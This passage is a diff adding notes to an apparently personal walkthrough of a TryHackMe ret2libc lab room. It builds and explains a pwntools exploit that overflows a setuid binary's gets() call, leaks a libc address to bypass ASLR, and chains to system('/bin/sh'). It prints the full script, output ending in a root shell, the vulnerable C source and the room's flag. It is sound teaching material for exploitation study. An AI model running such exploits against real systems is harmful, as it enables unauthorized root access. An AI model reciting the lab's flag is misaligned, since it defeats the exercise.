@@ -486,3 +486,248 @@ What is the name of the function that is under gets in .got.plt?
 In this part, we'll create the exploit. Open vim or nano and create a new python script to start things off. If you prefer a different editor over vim or nano (which are installed in the attached VM), you can create this script on your own machine and then transfer it via a python server as we did with our exploit_me binary.
 ### Part 1
 Importing the library
+```shell-session
+#!/usr/bin/env python3
+from pwn import *
+```
+`#!/usr/bin/env python3` is a shebang that makes our script a standalone executable, which means we don't need to run the script with python3.
+On the second line, we see `from pwn import *` which means we're importing everything from the pwn library into our script.
+### Part 2
+Defining variables
+```shell-session
+context.binary = binary = './exploit_me'
+
+elf = ELF(binary)
+rop = ROP(elf)
+
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+p = process()
+```
+On the first line, we're assigning the exploit_me binary into the binary variable and then adding this binary to the context. Context is a global variable that automatically sets settings (like architecture, operating system, bit-width) for our binary. So later, when we'll use our binary variable, we don't have to specify every setting manually.
+On the next line, we're creating a variable called `elf`so that we can manipulate it with our binary as an ELF object inside of our script. Once the variable has been created, we use that `elf`variable to create an ROP object called `rop`. We'll use both of these variables later in the code.
+Next, we're creating a variable called `libc`and assigning the full path of libc to it. Our binary will be using libc as an ELF object. If you don't know how to find which libc our binary is using, you can do that with the command ldd: `ldd exploit_me`
+The last thing we're doing is spawning our binary as a process. You can see that we didn't specify which process to spawn; that's because we added our binary into the context. Now we'll start creating the ROP chain to leak the gets function.
+### Part 3
+First ROP chain
+```shell-session
+padding = b'A'*18
+payload = padding
+payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
+payload += p64(elf.got.gets)
+payload += p64(elf.plt.puts)
+payload += p64(elf.symbols.main)
+```
+Now we have everything ready to start the first ROP chain to leak the libc base address.
+In the ROP chain, the first thing we do is create the variable `payload`and assign our overflow offset (=padding) to it.
+The basic logic of the ROP leak chain is as follows:
+1. Popping the **$RDI** register for our argument
+2. Filling the **$RDI** register with the address of the gets function
+3. Executing the puts function with loaded argument
+4. Returning to the main program with already leaked function
+Now let's break down every function in this part so you can fully understand what is going on.
+`p64()`
+- Returns the byte string from the data passed in the argument.
+`rop.find_gadget(['pop rdi', 'ret'])[0])`
+- Returns an array of all addresses in memory where the instructions ['pop rdi', 'ret'] occur, and since we only need the first one, we specify [0] for the first value in the array.
+`elf.got.gets`
+- Returns the address of the gets functions from the .got.plt section, which we discussed in the previous task.
+`elf.plt.puts`
+- Returns the address of the puts function from the .plt section.
+`elf.symbols.main`
+- Returns the address of the main function.
+Now that we have crafted the payload for our leakage, we need to send the payload, then receive and process the returned leak of the function.
+### Part 4
+Sending and processing
+```shell-session
+p.recvline()
+p.sendline(payload)
+p.recvline()
+leak = u64(p.recvline().strip().ljust(8,b'\0'))
+p.recvline()
+```
+In this part, you can see that we're using `p.recvline()` multiple times. With this function, we're getting rid of any unnecessary lines which may be printed in our terminal when running the exploit. We're trying to process the input so that you only see the leaked address being outputted.
+With `p.sendline(payload)` we're sending our created leakage payload. And the last thing we need to do is process the leak into a usable format. In its original state, the leak is a byte string, and we need it as a normal address, so that means we need to convert it somehow.
+We do that conversion with this line:
+`leak = u64(p.recvline().strip().ljust(8,b'\0'))`
+Let me explain what everything does in case you're curious. If not, you can skip this part and just keep in mind that it is processing the address to a usable and readable format.
+`u64()`
+- So with this function, we're unpacking the byte string. But here comes one little problem, which is solved by the next function.
+`ljust(8,b'\0'))`
+- One issue here is that the `u64()` function cannot unpack a byte string that isn't precisely 64 bits long (=8 bytes). Since our address doesn't come in this size, padding is required.
+- This padding is done by adding additional null bytes (before we unpack it) to the beginning of the string so that we have a byte string that is exactly 64 bits (=8 bytes) long.
+- The first argument is the final length of the byte string. In our case, it's 8.
+- The second argument is the byte that is being prefixed until the byte string is exactly 8 bytes long. In our case, it's the null byte.
+`strip()`
+- At the end of our byte string is the new line character **\n**, which we want to get rid of, and the strip function does exactly that.
+`p.recvline()`
+- Is just reading the initial byte string.
+If you are done reading, let's move on to the next part.
+### Part 5
+Rebase of libc
+```shell-session
+log.info(f'Gets leak => {hex(leak)}')
+libc.address = leak - libc.symbols.gets
+log.info(f'Libc base => {hex(libc.address)}')
+```
+In this part, we're printing our processed leak address. And then there's a little bit of math involved in calculating the base address.
+Let me explain it.
+- Imagine our leak as some address that changes every time. The only thing that we know about it is that this address belongs to the gets function. We want to calculate the base address of the libc, which will also be different every time.
+- But now comes the interesting part. The range between the base address and the gets function is always the same. And since we can treat addresses like numbers, we can just subtract the address of the gets function from our leak.
+- This gives us the base address of the currently linked libc, and we print this value out to check if we've done everything correctly.
+- We know everything is correct when the base address ends with three 0's.
+Now when we have figured out how to evade ASLR protection, we can continue with the actual ret2libc exploit.
+### Part 6
+Second ROP chain
+```shell-session
+payload = padding
+payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
+payload += p64(next(libc.search(b'/bin/sh')))
+payload += p64(rop.find_gadget(['ret'])[0])
+payload += p64(libc.symbols.system)
+```
+We can start by creating another payload. And we can reuse the variable payload for this. So once again, we can begin by assigning the already created padding as the beginning of the payload to cause the buffer overflow.
+The basic logic of the "spawn shell" ROP chain:
+1. Popping the **$RDI** register for our argument.
+2. Filling the **$RDI** register with the byte string "/bin/sh".
+3. Ret instruction is for the stack alignment (just think of this as something that we need to do; otherwise, some problems may occur).
+4. Executing the system function with a loaded argument.
+Now let's break down every function in this part so you can fully understand what is going on.
+We've already talked about the `p64()` and `find_gadget()` functions, so I'll skip these.
+`libc.search(b'/bin/sh')`
+- Returns the iterator for each virtual address that matches the byte string "/bin/sh".
+`next()`
+- Function returns the "next" iterator from the founded matches.
+`libc.symbols.system`
+- Returns the address of the system function inside of our linked libc.
+- Since we initially defined the libc variable as an ELF object and later rebased this libc with our first ROP chain, we can now call the system function right from the libc.
+Now we have everything finally ready, so let's continue into the final part, where we'll send the second payload and get an interactive shell.
+### Part 7
+Sending the final payload
+```shell-session
+p.sendline(payload)
+p.recvline()
+p.interactive()
+```
+Here we're just sending the second payload and cleaning out some unnecessary output. The last line starts the interactive mode, so we can interact with the created shell if everything went well.
+And that's about it. Go write the exploit yourself if you weren't following along step by step. And if you've done everything well, you should have root privileges, so go grab the flag!
+Answer the questions below
+```text
+andy@ubuntu:~$ cat ret2libc.py
+#!/usr/bin/env python3
+from pwn import *
+context.binary = binary = './exploit_me'
+
+elf = ELF(binary)
+rop = ROP(elf)
+
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+p = process()
+
+padding = b'A'*18
+payload = padding
+payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
+payload += p64(elf.got.gets)
+payload += p64(elf.plt.puts)
+payload += p64(elf.symbols.main)
+
+p.recvline()
+p.sendline(payload)
+p.recvline()
+leak = u64(p.recvline().strip().ljust(8,b'\0'))
+p.recvline()
+
+log.info(f'Gets leak => {hex(leak)}')
+libc.address = leak - libc.symbols.gets
+log.info(f'Libc base => {hex(libc.address)}')
+
+payload = padding
+payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
+payload += p64(next(libc.search(b'/bin/sh')))
+payload += p64(rop.find_gadget(['ret'])[0])
+payload += p64(libc.symbols.system)
+
+p.sendline(payload)
+p.recvline()
+p.interactive()
+
+andy@ubuntu:~$ python3 ret2libc.py
+[*] '/home/andy/exploit_me'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] Loading gadgets for '/home/andy/exploit_me'
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process '/home/andy/exploit_me': pid 1361
+[*] Gets leak => 0x7f1131b78190
+[*] Libc base => 0x7f1131af8000
+[*] Switching to interactive mode
+```
+```text
+$ id
+uid=0(root) gid=1002(andy) groups=1002(andy)
+```
+```text
+$ ls
+exploit_me  ret2libc.py
+```
+```text
+$ cd /root
+```
+
+## Privilege Escalation
+```text
+$ ls
+root.txt  source_code.c
+```
+```text
+$ cat root.txt
+thm{dGhlIG1vc3QgcmFuZG9tIHZhbHVlIHlvdSBjb3VsZCBldmVyIGd1ZXNz}
+```
+```text
+$ cat source_code.c
+#include <stdio.h>
+
+int main() {
+    setuid(0);
+
+    char name[10];
+    printf("Type your name: \n");
+    gets(name);
+    printf("Your name is: %s\n", name);
+
+    return 0;
+}
+
+:) Now go to theseus
+```
+What is the flag?
+### Task 8  Conclusion
+So if you got here, you should have a basic idea of how the ret2libc attack works.
+I made the exploiting a little bit harder and didn't turn off the ASLR.
+It's turned on by default on most Linux distributions, plus I wanted you to know that it is possible to bypass any of the protections.
+You can still encounter some CTFs where the ASLR will be turned off; in that case, we don't have to leak the base address of the libc, and we can just look at it with the ldd. Thus we are skipping the first ROP chain.
+If you want to practice ret2libc, I recommend the TryHackMe room called Chronicle.
+- [Chronicle](https://tryhackme.com/room/chronicle)
+If you find any mistakes or just want to ask something, you can contact me on Twitter; the link is on my THM profile.
+Answer the questions below
+I hope you enjoyed the room and learned something new.
+Question Done
+
+## Flags / Answers
+- ***thm{dGhlIG1vc3QgcmFuZG9tIHZhbHVlIHlvdSBjb3VsZCBldmVyIGd1ZXNz}***
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f9edb4b86481a1cfc867ddf/room-content/9642c13fab349ee004cb89843fb0b99f.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f9edb4b86481a1cfc867ddf/room-content/62592dbac9dcc3247c726c1c508eb4ac.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f9edb4b86481a1cfc867ddf/room-content/3f099001fe83515047ef196efb1388fd.png)
+
+## Notes / Lessons Learned
+[[Theseus]]
+
